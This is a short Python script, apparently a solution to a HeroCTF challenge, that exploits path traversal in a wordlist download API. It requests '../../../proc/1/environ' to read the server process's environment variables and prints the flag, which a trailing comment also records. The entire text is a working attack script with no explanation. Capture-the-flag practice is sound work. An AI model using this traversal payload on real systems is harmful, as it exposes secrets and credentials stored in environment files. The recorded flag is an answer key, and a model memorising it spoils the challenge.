import requests

chal = "http://dyn07.heroctf.fr:10787"

r = requests.post(
    f"{chal}/api/wordlist/download", json={"filename": "../../../proc/1/environ"}
)

content = r.json().get("content", "")
for var in content.split("\x00"):
    if var.startswith("FLAG="):
        print(var.split("=", 1)[1])
        break

# Hero{e9e2b63a0daa9ee41d2133b450425b2cd7c7510e5a28b655748456bd3f6e5c2a}
